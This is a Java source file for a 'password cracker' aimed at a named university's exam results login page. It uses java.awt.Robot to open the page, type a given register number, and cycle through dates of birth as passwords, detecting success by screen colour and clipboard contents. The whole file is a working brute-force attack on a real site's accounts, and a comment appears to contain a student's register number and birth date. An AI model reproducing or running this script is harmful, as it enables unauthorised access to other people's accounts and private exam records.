/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package passwordcracker;

import java.awt.AWTException;
import java.awt.Color;
import java.awt.Desktop;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.awt.event.KeyEvent;
import java.awt.event.MouseEvent;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.Scanner;

/**
 *
 * @author Jeremy Sam
 */

public class Cracker extends Thread implements Runnable{

    /**
     * @param args the command line arguments
     */

    static int[] rn = new int[9];
    static int[] dob = new int[8];

    public static void main(String[] args) throws MalformedURLException, IOException, AWTException, UnsupportedFlavorException {
        Scanner s = new Scanner(System.in);
        System.out.println("Enter register no. ");
        char[] reg = s.nextLine().toUpperCase().toCharArray();
        System.out.println("Enter Dob in ddmmyyyy");
        char[] date = s.nextLine().toCharArray();
        int z=0;
        for(int i : reg){
            rn[z] = i;
            z++;
        }
        z=0;
        for(int i : date){
            dob[z] = i;
            z++;
        }
        Cracker t = new Cracker();
        t.start();
    }

    @Override
    public void run() {
        try {
            Robot r = new Robot();
            Desktop desktop = Desktop.getDesktop();
            Clipboard c = Toolkit.getDefaultToolkit().getSystemClipboard();
            String paste;
            int count = 0;
            try {
                desktop.browse(new URI("http://web.karunya.edu/exam/login.asp"));
                r.setAutoWaitForIdle(true);
                r.setAutoDelay(500);
                //Thread.sleep(2500);
                while(true){                                //checks whur16cs258    01011997
                    // ether the page has loaded yet
//                    Thread.sleep(200);
                    Color color = r.getPixelColor(265, 20);
//                    r.mouseMove(902,27);
//                    System.out.println(color);
                    if(color.getRed()==136&&color.getGreen()==23&&color.getBlue()==152){
                        break;
                    }
                    sleep(5);
                }
                while(true){
                    r.waitForIdle();
                    r.mouseMove(980, 355);                        //goes to text field
                    r.mousePress(MouseEvent.BUTTON1_DOWN_MASK);         //mouse click
                    r.mouseRelease(MouseEvent.BUTTON1_DOWN_MASK);

                    for(int i : rn){                              //types reg nos.
                        r.keyPress(i);
                        r.keyRelease(i);
                    }
                    sleep(3);
                    r.keyPress(KeyEvent.VK_TAB);                //pressing tab key
                    r.keyRelease(KeyEvent.VK_TAB);
                    r.delay(2);

                    for(int d : dob){                          //types DOB
                        r.keyPress(d);
                        r.keyRelease(d);
                    }
                    r.waitForIdle();
                    sleep(5);
                    System.out.println("Trial "+(count+1)+" Password: "+(char)dob[0]+(char)dob[1]
                            +"/"+(char)dob[2]+(char)dob[3]
                            +"/"+(char)dob[4]+(char)dob[5]+(char)dob[6]+(char)dob[7]);

                    r.keyPress(KeyEvent.VK_ENTER);          //presses enter key
                    r.keyRelease(KeyEvent.VK_ENTER);
                    r.delay(2);

                    while(true){                                //checks whether the page has loaded yet
                        Color color = r.getPixelColor(902, 27);
                        if(color.getRed()==50&&color.getGreen()==102&&color.getBlue()==176){
                            break;
                        }
                        sleep(5);
                    }

                    sleep(18);                //delay for link to refresh

                    r.mouseMove(980, 66);           //goes to link area 
                    r.mousePress(MouseEvent.BUTTON1_DOWN_MASK);
                    r.mouseRelease(MouseEvent.BUTTON1_DOWN_MASK);
                    sleep(5);

                    r.keyPress(KeyEvent.VK_CONTROL);        //cntrl+c
                    r.keyPress(KeyEvent.VK_C);              //copying the link
                    sleep(2);
                    r.keyRelease(KeyEvent.VK_C);
                    r.keyRelease(KeyEvent.VK_CONTROL);
                    sleep(5);
                    r.waitForIdle();
                    while(true){                            //checks if link available with the clipboard
                        try{
                            paste = (String)c.getData(DataFlavor.stringFlavor);
                            break;
                        }catch(IllegalStateException ise){
                            r.delay(2);
                        }
                    }
                    count++;

                    if(paste.equals("http://web.karunya.edu/exam/may18__resultexam.asp")){
                        System.out.println("Password "+(char)dob[0]+(char)dob[1]
                                +"/"+(char)dob[2]+(char)dob[3]
                                +"/"+(char)dob[4]+(char)dob[5]+(char)dob[6]+(char)dob[7]);
                        break;
                    }
                    System.out.println("failed!!!");

                    //Password Algorithm
                    dob[1]++;
                    if(dob[1]==58){
                        dob[0]++;
                        dob[1]=48;
                    }
                    if(dob[0]==50&&dob[1]==57&&dob[2]==48&&dob[3]==50){             //february 28 days
                        dob[0]=48;
                        dob[1]=49;
                        dob[3]++;
                    }
                    else if(dob[0]==51&&dob[1]==49){                            // 30 days month
                        if(dob[3]==52||dob[3]==54||dob[3]==57||(dob[2]==49&&dob[3]==49)){
                            dob[0]=48;
                            dob[3]++;
                            if(dob[3]==58){
                                dob[3]=48;
                                dob[2]++;
                            }
                        }
                    }
                    else if(dob[0]==51&&dob[1]==50){        //31 days month
                        dob[0]=48;
                        dob[1]=49;
                        if(dob[3]==50&&dob[2]==49){         //last day of 12th month
                            dob[7]++;
                            dob[2]=48;
                            dob[3]=49;
                        }
                        else
                            dob[3]++;
                    }
                }
                r.keyPress(KeyEvent.VK_ESCAPE);
                r.keyRelease(KeyEvent.VK_ESCAPE);

            } catch (InterruptedException ex) {
                System.out.println("error 1");
            } catch (UnsupportedFlavorException ex) {
                System.out.println("error 2");
            } catch (IOException ex) {
                System.out.println("error 3");
            } catch (URISyntaxException ex) {
                System.out.println("error 4");            }
            System.out.println("Success at "+count+"th trial");
        } catch (AWTException ex) {
            System.out.println("error 5");
        }
    }
}